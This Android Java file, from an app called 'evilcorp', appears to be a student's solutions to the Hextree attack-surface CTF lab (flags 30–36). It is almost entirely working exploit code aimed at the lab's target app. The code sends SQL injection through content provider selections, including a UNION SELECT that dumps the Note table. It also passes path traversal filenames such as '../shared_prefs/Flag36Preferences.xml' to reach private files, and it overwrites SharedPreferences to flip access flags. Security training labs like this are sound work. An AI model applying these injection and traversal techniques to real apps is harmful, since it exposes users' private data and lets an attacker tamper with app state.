package com.example.evilcorp;

import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;

public class ContentProvidersActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_content_providers);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

/// //////////////////////////////////////////////


        // Back button
        Button btnToMain = findViewById(R.id.backButtonFromContentProviders);
        btnToMain.setOnClickListener(v -> {
            Intent intent = new Intent(ContentProvidersActivity.this, MainActivity.class);
            startActivity(intent);
        });
/// /////////////////////////////////////////////////

        // flag 30 code

        Button flag30Button = findViewById(R.id.flag30Button);
        flag30Button.setOnClickListener(v->{

            Cursor cursor = getContentResolver().query(
                    Uri.parse("content://io.hextree.flag30/success"),
                    null, null, null, null
            );

            if (cursor != null && cursor.moveToFirst()) {
                String flag = cursor.getString(cursor.getColumnIndexOrThrow("value"));
                Toast.makeText(this, flag, Toast.LENGTH_LONG).show();
                Log.i("Flag30", flag);
                cursor.close();
            }

        });


        /// /////////////////////////////////////////////////

        // flag 31 code

        Button flag31Button = findViewById(R.id.flag31Button);
        flag31Button.setOnClickListener(v->{

            Cursor cursor = getContentResolver().query(
                    Uri.parse("content://io.hextree.flag31/flag/31"),
                    null, null, null, null
            );

            if (cursor != null && cursor.moveToFirst()) {
                String flag = cursor.getString(cursor.getColumnIndexOrThrow("value"));
                Toast.makeText(this, flag, Toast.LENGTH_LONG).show();
                Log.i("Flag31", flag);
                cursor.close();
            }

        });



////        solution provided in the Hextree video
//
//        Cursor cursor = getContentResolver().query(
//                Uri.parse("content://io.hextree.flag30/success"),
//                null, null,
//                null, null
//        );
//
//// dump Uri

//        if (cursor!=null && cursor.moveToFirst()) {
//            do {
//                StringBuilder sb = new StringBuilder();
//                for (int i = 0; i < cursor.getColumnCount(); i++) {
//                    if (sb.length() > 0) {
//                        sb.append(", ");
//                    }
//                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
//                }
//                Log.d("evil", sb.toString());
//            } while (cursor.moveToNext());
//        }


        /// /////////////////////////////////////////////////

        // flag 32 code SQL injection

        Button flag32Button = findViewById(R.id.flag32Button);
        flag32Button.setOnClickListener(v->{

            TextView output = findViewById(R.id.contentProvidersTextView);
            output.setText(""); // clear any existing text
            Cursor cursor = getContentResolver().query(
                    Uri.parse("content://io.hextree.flag32/flags"),
                    null,"1=1) OR name='flag32' --", null, null
            );

            if (cursor != null) {

                String[] columnNames = cursor.getColumnNames();

                while (cursor.moveToNext()) {
                    for (String columnName : columnNames) {
                        String value = cursor.getString(
                                cursor.getColumnIndexOrThrow(columnName)
                        );
                        Log.i("FLAG32", columnName + ": " + value);
                    }
                }
                cursor.close();
            }

        });




        /// /////////////////////////////////////////////////

        // flag 33.1 code

        Button flag33_1_Button = findViewById(R.id.flag33_1_Button);
        flag33_1_Button.setOnClickListener(v->{


            Intent intent = new Intent();
            intent.setAction("io.hextree.FLAG33");
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag33Activity1");
            startActivityForResult(intent, 1);

        });





        /// /////////////////////////////////////////////////

        // flag 33.2 code

        Intent intent33_2 = getIntent();

        if (intent33_2.getAction() != null) {

            ContentResolver resolver = getContentResolver();

            String injection =
                    "_id=2 UNION SELECT 1,title,content,'a' FROM Note";

            Cursor cursor = resolver.query(
                    intent33_2.getData(),
                    null,
                    injection,
                    null,
                    null
            );

            if (cursor != null) {
                String[] columnNames = cursor.getColumnNames();

                while (cursor.moveToNext()) {
                    for (String columnName : columnNames) {
                        String value = cursor.getString(
                                cursor.getColumnIndexOrThrow(columnName)
                        );
                        Log.i("QueryFlag33.2", columnName + ": " + value);
                    }
                }
                cursor.close();
            }
        }






        /// /////////////////////////////////////////////////

        // flag 34 code



        Button flag34Button = findViewById(R.id.flag34Button);
        flag34Button.setOnClickListener(v->{
            Intent intent = new Intent();
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag34Activity");
            intent.putExtra("filename","flags/flag34.txt");
            startActivityForResult(intent,1);
        });




        /// /////////////////////////////////////////////////

        // flag 35 code

        Button flag35Button = findViewById(R.id.flag35Button);
        flag35Button.setOnClickListener(v->{
            Intent intent = new Intent();
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag35Activity");
            intent.putExtra("filename","../flag35.txt");
            startActivityForResult(intent,1);
        });



        /// /////////////////////////////////////////////////

        // flag 36 code

        Button flag36Button = findViewById(R.id.flag36Button);
        flag36Button.setOnClickListener(v->{
            Intent intent = new Intent();
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag35Activity");
            intent.putExtra("filename", "../shared_prefs/Flag36Preferences.xml");
            startActivityForResult(intent,1);
        });


    }


    ///
    ///
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);


        // continuation for flag 33.1 code
//        //This onActivityResult is called whenever the target app calls setResult.
//        Cursor cursor = getContentResolver().query(data.getData(), null, "_id=2 UNION SELECT 1,title,content,'a' FROM Note", null, null);
//
//        if (cursor != null) {
//            String[] columns = cursor.getColumnNames();
//            while (cursor.moveToNext()) {
//                for (String column : columns) {
//                    Log.i(
//                            "FLAG33.1",
//                            column + ": " + cursor.getString(
//                                    cursor.getColumnIndexOrThrow(column)
//                            )
//                    );
//                }
//            }
//            cursor.close();
//        }



//// Continuation for flag 34 code
//        Log.i("io.hextree","ReturnedURI" + data.getData());
//        try{
//            InputStream inputStream = getContentResolver().openInputStream(data.getData());
//            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
//            String line;
//            while ((line = reader.readLine()) != null) {
//                Log.i("FLAG34", line);
//            }
//
//        } catch (IOException ignored) {
//
//        }



//        // Continuation for flag 35 code
//        Log.i("io.hextree","ReturnedURI" + data.getData());
//        try{
//            InputStream inputStream = getContentResolver().openInputStream(data.getData());
//            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
//            String line;
//            while ((line = reader.readLine()) != null) {
//                Log.i("FLAG35", line);
//            }
//
//        } catch (IOException ignored) {
//
//        }


        // Continuation for flag 36 code//// Using Activity35 to edit a file required for Activity 36
        Log.i("io.hextree","FLAG36" + data.getData());
        Uri sharedPref = data.getData();
        try{
            InputStream inputStream = getContentResolver().openInputStream(sharedPref);
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));

            String line;
            StringBuilder sb = new StringBuilder();

            //Modifying content in buffer
            while ((line = reader.readLine()) != null) {
                line = line.replace("value=\"false\"", "value=\"true\"");
                sb.append(line).append("\n");
            }

            reader.close();

            String editXML = sb.toString();
            Log.i("FLAG36", "Modifying SharedPrefs");

            OutputStream outputStream = getContentResolver().openOutputStream(sharedPref, "wt");
            if (outputStream == null) throw new RuntimeException("openOutputStream returned null");

            outputStream.write(editXML.getBytes(StandardCharsets.UTF_8));
            outputStream.flush();
            outputStream.close();


            // sending an Intent to Activity 36 to view the flag.

            Intent Flag36Intent = new Intent();
            Flag36Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag36Activity");
            startActivity(Flag36Intent);
            Log.i("FLAG36", "sent Flag 36 Intent");




        } catch (IOException ignored) {
            Log.e("FLAG36", "Exploit failed", ignored);
        }
        finish();



    }

}



